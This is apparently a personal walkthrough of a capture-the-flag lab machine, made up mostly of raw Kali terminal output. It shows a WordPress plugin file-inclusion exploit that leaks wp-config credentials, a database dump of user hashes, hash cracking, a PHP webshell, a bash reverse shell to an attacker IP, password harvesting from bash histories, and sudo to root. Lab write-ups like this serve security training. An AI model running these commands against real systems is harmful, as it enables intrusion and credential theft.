@@ -1,0 +1,473 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 192.168.241.148
+Connected to 192.168.241.148.
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+220-
+220 
+Name (192.168.241.148:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+550 Permission denied.
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+226 Directory send OK.
+ftp> more note
+Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
+ftp> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //192.168.241.148 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	kathy           Disk      Fred, What are we doing here?
+	tmp             Disk      All temporary files should be stored here
+	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            RED
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+/** WordPress Administration Bootstrap */
+require_once( dirname( __FILE__ ) . '/admin.php' );
+
+if ( ! current_user_can( 'list_users' ) )
+	wp_die( __( 'Cheatin&#8217; uh?' ), 403 );
+
+
+https://192.168.241.148:12380/robots.txt
+
+User-agent: *
+Disallow: /admin112233/
+Disallow: /blogblog/
+
+This could of been a BeEF-XSS hook ;)
+
+wpscan cannot find any plugins but can look ourselves
+https://192.168.241.148:12380/blogblog/wp-content/plugins/
+
+=== Advanced video embed  ===
+...
+Stable tag: 1.0
+Version: 1.0
+...
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit WordPress Plugin Advanced Video
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin Advanced Video 1.0 - Local File Inclusion                         | php/webapps/39646.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -k "https://192.168.241.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=RANDOM&short=1&term=1&thumb=../wp-config.php"
+https://192.168.241.148:12380/blogblog/?p=210                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+Take the last number shown in the response, divide by 10 → candidate post id.
+
+wasnt there. so instead we go into the uploads
+
+https://192.168.241.148:12380/blogblog/wp-content/uploads/546781482.jpeg
+
+┌──(root㉿kali)-[/home/kali]
+└─# wget https://192.168.241.148:12380/blogblog/wp-content/uploads/546781482.jpeg --no-check-certificate       
+--2025-10-09 21:41:31--  https://192.168.241.148:12380/blogblog/wp-content/uploads/546781482.jpeg
+Connecting to 192.168.241.148:12380... connected.
+WARNING: The certificate of ‘192.168.241.148’ is not trusted.
+WARNING: The certificate of ‘192.168.241.148’ doesn't have a known issuer.
+The certificate's owner does not match hostname ‘192.168.241.148’
+HTTP request sent, awaiting response... 200 OK
+Length: 3042 (3.0K) [image/jpeg]
+Saving to: ‘546781482.jpeg’
+
+546781482.jpeg                100%[==============================================>]   2.97K  --.-KB/s    in 0s      
+
+2025-10-09 21:41:31 (114 MB/s) - ‘546781482.jpeg’ saved [3042/3042]
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat 546781482.jpeg                                                                             
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
+define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
+define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
+define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
+define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
+define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
+define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
+define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+define('WP_HTTP_BLOCK_EXTERNAL', true);
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# mysql --skip-ssl-verify-server-cert -h 192.168.241.148 -u root -p'plbkac'
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 177
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+
+
+MySQL [wordpress]> select * from wp_users;
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+| ID | user_login | user_pass                          | user_nicename | user_email            | user_url         | user_registered     | user_activation_key | user_status | display_name    |
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+|  1 | John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. | john          | john@red.localhost    | http://localhost | 2016-06-03 23:18:47 |                     |           0 | John Smith      |
+|  2 | Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 | elly          | Elly@red.localhost    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |
+|  3 | Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 | peter         | peter@red.localhost   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |
+|  4 | barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 | barry         | barry@red.localhost   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |
+|  5 | heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 | heather       | heather@red.localhost |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |
+|  6 | garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 | garry         | garry@red.localhost   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |
+|  7 | harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 | harry         | harry@red.localhost   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |
+|  8 | scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 | scott         | scott@red.localhost   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |
+|  9 | kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 | kathy         | kathy@red.localhost   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |
+| 10 | tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 | tim           | tim@red.localhost     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |
+| 11 | ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | zoe           | zoe@red.localhost     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |
+| 12 | Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. | dave          | dave@red.localhost    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |
+| 13 | Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 | simon         | simon@red.localhost   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |
+| 14 | Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. | abby          | abby@red.localhost    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |
+| 15 | Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 | vicki         | vicki@red.localhost   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |
+| 16 | Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 | pam           | pam@red.localhost     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+16 rows in set (0.028 sec)
+
+MySQL [wordpress]> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$P$B7889EMq/erHIuZapMB8GEizebcIy9.' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# hashid hash                               
+--File 'hash'--
+Analyzing '$P$B7889EMq/erHIuZapMB8GEizebcIy9.'
+[+] Wordpress ≥ v2.6.2 
+[+] Joomla ≥ v2.5.18 
+[+] PHPass' Portable Hash 
+--End of file 'hash'--                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+incorrect        (?)     
+1g 0:00:00:03 DONE (2025-10-09 21:49) 0.2898g/s 53593p/s 53593c/s 53593C/s jahmel..iloveaj2
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+logged in
+uploaded plugin php webshell
+run
+bash -c "bash -i >& /dev/tcp/192.168.45.210/443 0>&1"
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443                            
+listening on [any] 443 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.241.148] 40988
+bash: cannot set terminal process group (1327): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
+
+www-data@red:/home$ find /home -type f -readable -printf '%M %u %g %s %p\n' 2>/dev/null                         
+-rw-r--r-- MFrei MFrei 3771 /home/MFrei/.bashrc
+-rw-r--r-- MFrei MFrei 220 /home/MFrei/.bash_logout
+-rw-r--r-- MFrei MFrei 675 /home/MFrei/.profile
+-rw-r--r-- Sam Sam 3771 /home/Sam/.bashrc
+-rw-r--r-- root root 5 /home/Sam/.bash_history
+-rw-r--r-- Sam Sam 220 /home/Sam/.bash_logout
+-rw-r--r-- Sam Sam 675 /home/Sam/.profile
+-rw-r--r-- CCeaser CCeaser 3771 /home/CCeaser/.bashrc
+-rw-r--r-- root root 10 /home/CCeaser/.bash_history
+-rw-r--r-- CCeaser CCeaser 220 /home/CCeaser/.bash_logout
+-rw-r--r-- CCeaser CCeaser 675 /home/CCeaser/.profile
+-rw-r--r-- www www 3771 /home/www/.bashrc
+-rw-r--r-- www www 220 /home/www/.bash_logout
+-rw-r--r-- www www 675 /home/www/.profile
+-rw-r--r-- DSwanger DSwanger 3771 /home/DSwanger/.bashrc
+-rw-r--r-- DSwanger DSwanger 220 /home/DSwanger/.bash_logout
+-rw-r--r-- DSwanger DSwanger 675 /home/DSwanger/.profile
+-rw-r--r-- JBare JBare 3771 /home/JBare/.bashrc
+-rw-r--r-- JBare JBare 220 /home/JBare/.bash_logout
+-rw-r--r-- JBare JBare 675 /home/JBare/.profile
+-rw-r--r-- mel mel 3771 /home/mel/.bashrc
+-rw-r--r-- mel mel 220 /home/mel/.bash_logout
+-rw-r--r-- mel mel 675 /home/mel/.profile
+-rw-r--r-- jess jess 3771 /home/jess/.bashrc
+-rw-r--r-- jess jess 220 /home/jess/.bash_logout
+-rw-r--r-- jess jess 675 /home/jess/.profile
+-rw-r--r-- MBassin MBassin 3771 /home/MBassin/.bashrc
+-rw-r--r-- MBassin MBassin 220 /home/MBassin/.bash_logout
+-rw-r--r-- MBassin MBassin 675 /home/MBassin/.profile
+-rw-r--r-- kai kai 3771 /home/kai/.bashrc
+-rw-r--r-- kai kai 220 /home/kai/.bash_logout
+-rw-r--r-- kai kai 675 /home/kai/.profile
+-rw-r--r-- elly elly 3771 /home/elly/.bashrc
+-rw-r--r-- elly elly 220 /home/elly/.bash_logout
+-rw-r--r-- elly elly 675 /home/elly/.profile
+-rw-r--r-- Drew Drew 3771 /home/Drew/.bashrc
+-rw-r--r-- Drew Drew 220 /home/Drew/.bash_logout
+-rw-r--r-- Drew Drew 675 /home/Drew/.profile
+-rw-r--r-- JLipps JLipps 3771 /home/JLipps/.bashrc
+-rw-r--r-- JLipps JLipps 220 /home/JLipps/.bash_logout
+-rw-r--r-- JLipps JLipps 675 /home/JLipps/.profile
+-rw-r--r-- jamie jamie 3771 /home/jamie/.bashrc
+-rw-r--r-- jamie jamie 220 /home/jamie/.bash_logout
+-rw-r--r-- jamie jamie 675 /home/jamie/.profile
+-rw-r--r-- Taylor Taylor 3771 /home/Taylor/.bashrc
+-rw-r--r-- Taylor Taylor 220 /home/Taylor/.bash_logout
+-rw-r--r-- Taylor Taylor 675 /home/Taylor/.profile
+-rw-r--r-- peter peter 3771 /home/peter/.bashrc
+-rw-r--r-- peter peter 0 /home/peter/.zshrc
+-rw-r--r-- peter peter 220 /home/peter/.bash_logout
+-rw-r--r-- peter peter 0 /home/peter/.sudo_as_admin_successful
+-rw-r--r-- peter peter 675 /home/peter/.profile
+-rw-r--r-- SHayslett SHayslett 3771 /home/SHayslett/.bashrc
+-rw-r--r-- SHayslett SHayslett 220 /home/SHayslett/.bash_logout
+-rw-r--r-- SHayslett SHayslett 675 /home/SHayslett/.profile
+-rw-r--r-- JKanode JKanode 3771 /home/JKanode/.bashrc
+-r--r--r-- JKanode JKanode 171 /home/JKanode/.bash_history
+-rw-r--r-- JKanode JKanode 220 /home/JKanode/.bash_logout
+-rw-r--r-- JKanode JKanode 675 /home/JKanode/.profile
+-rw-r--r-- AParnell AParnell 3771 /home/AParnell/.bashrc
+-rw-r--r-- AParnell AParnell 220 /home/AParnell/.bash_logout
+-rw-r--r-- AParnell AParnell 675 /home/AParnell/.profile
+-rw-r--r-- CJoo CJoo 3771 /home/CJoo/.bashrc
+-rw-r--r-- CJoo CJoo 220 /home/CJoo/.bash_logout
+-rw-r--r-- CJoo CJoo 675 /home/CJoo/.profile
+-rw-r--r-- Eeth Eeth 3771 /home/Eeth/.bashrc
+-rw-r--r-- root root 5 /home/Eeth/.bash_history
+-rw-r--r-- Eeth Eeth 220 /home/Eeth/.bash_logout
+-rw-r--r-- Eeth Eeth 675 /home/Eeth/.profile
+-r--r--r-- www-data www-data 33 /home/local.txt
+-rw-r--r-- RNunemaker RNunemaker 3771 /home/RNunemaker/.bashrc
+-rw-r--r-- RNunemaker RNunemaker 220 /home/RNunemaker/.bash_logout
+-rw-r--r-- RNunemaker RNunemaker 675 /home/RNunemaker/.profile
+-rw-r--r-- SHAY SHAY 3771 /home/SHAY/.bashrc
+-rw-r--r-- SHAY SHAY 220 /home/SHAY/.bash_logout
+-rw-r--r-- SHAY SHAY 675 /home/SHAY/.profile
+-rw-r--r-- ETollefson ETollefson 3771 /home/ETollefson/.bashrc
+-rw-r--r-- ETollefson ETollefson 220 /home/ETollefson/.bash_logout
+-rw-r--r-- ETollefson ETollefson 675 /home/ETollefson/.profile
+-rw-r--r-- IChadwick IChadwick 3771 /home/IChadwick/.bashrc
+-rw-r--r-- root root 5 /home/IChadwick/.bash_history
+-rw-r--r-- IChadwick IChadwick 220 /home/IChadwick/.bash_logout
+-rw-r--r-- IChadwick IChadwick 675 /home/IChadwick/.profile
+-rw-r--r-- LSolum2 LSolum2 3771 /home/LSolum2/.bashrc
+-rw-r--r-- root root 12 /home/LSolum2/.bash_history
+-rw-r--r-- LSolum2 LSolum2 220 /home/LSolum2/.bash_logout
+-rw-r--r-- LSolum2 LSolum2 675 /home/LSolum2/.profile
+-rw-r--r-- SStroud SStroud 3771 /home/SStroud/.bashrc
+-rw-r--r-- SStroud SStroud 220 /home/SStroud/.bash_logout
+-rw-r--r-- SStroud SStroud 675 /home/SStroud/.profile
+-rw-r--r-- LSolum LSolum 3771 /home/LSolum/.bashrc
+-rw-r--r-- LSolum LSolum 220 /home/LSolum/.bash_logout
+-rw-r--r-- LSolum LSolum 675 /home/LSolum/.profile
+-rw-r--r-- NATHAN NATHAN 3771 /home/NATHAN/.bashrc
+-rw-r--r-- NATHAN NATHAN 220 /home/NATHAN/.bash_logout
+-rw-r--r-- NATHAN NATHAN 675 /home/NATHAN/.profile
+-rw-r--r-- zoe zoe 3771 /home/zoe/.bashrc
+-rw-r--r-- zoe zoe 220 /home/zoe/.bash_logout
+-rw-r--r-- zoe zoe 675 /home/zoe/.profile
+www-data@red:/home$ cat /home/Sam/.bash_history
+exit
+www-data@red:/home$ cat /home/*/.bash_history
+free
+exit
+exit
+exit
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 ssh peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+exit
+whoami
+exit
+cat: /home/peter/.bash_history: Permission denied
+www-data@red:/home$ 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh JKanode@192.168.241.148         
+The authenticity of host '192.168.241.148 (192.168.241.148)' can't be established.
+ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.241.148' (ED25519) to the list of known hosts.
+thi-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+JKanode@192.168.241.148's password: 
+Permission denied, please try again.
+JKanode@192.168.241.148's password: 
+Permission denied, please try again.
+JKanode@192.168.241.148's password: 
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh peter@192.168.241.148
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+peter@192.168.241.148's password: 
+Welcome back!
+
+
+red% ls
+red% ls -lsa
+total 68
+ 4 drwxr-xr-x  3 peter peter  4096 Oct 10 03:04 .
+ 4 drwxr-xr-x 32 root  root   4096 Jun  9  2021 ..
+ 4 -rw-------  1 peter peter     1 Jun  5  2016 .bash_history
+ 4 -rw-r--r--  1 peter peter   220 Jun  3  2016 .bash_logout
+ 4 -rw-r--r--  1 peter peter  3771 Jun  3  2016 .bashrc
+ 4 drwx------  2 peter peter  4096 Jun  6  2016 .cache
+ 4 -rw-r--r--  1 peter peter   675 Jun  3  2016 .profile
+ 0 -rw-r--r--  1 peter peter     0 Jun  3  2016 .sudo_as_admin_successful
+40 -rw-rw-r--  1 peter peter 39206 Oct 10 03:04 .zcompdump
+ 0 -rw-r--r--  1 peter peter     0 Jun  9  2021 .zshrc
+red% sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter: 
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+red% sudo /bin/bash -p
+root@red:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@red:~# 
+
+
+
